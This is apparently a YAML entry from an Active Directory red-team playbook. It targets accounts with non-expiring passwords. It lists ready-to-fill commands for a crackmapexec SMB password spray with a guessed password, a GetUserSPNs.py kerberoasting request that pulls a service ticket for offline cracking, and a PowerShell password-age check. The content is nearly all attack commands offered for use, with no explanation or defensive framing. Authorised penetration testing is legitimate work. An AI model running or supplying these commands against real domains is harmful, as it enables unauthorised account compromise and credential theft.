name: PasswordNeverExpires
description: Accounts with non-expiring passwords are high-value spray/kerberoast targets
commands:
- '# Password spray (check for weak passwords)'
- crackmapexec smb <DC_IP> -u '<TARGET_USER>' -p 'Company2024!' --continue-on-success
- ''
- '# If account has SPN - Kerberoast it'
- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -request-user '<TARGET_USER>'
- ''
- '# Check password last set date'
- Get-ADUser '<TARGET_USER>' -Properties PasswordLastSet | Select Name, PasswordLastSet
opsec: []
references: []
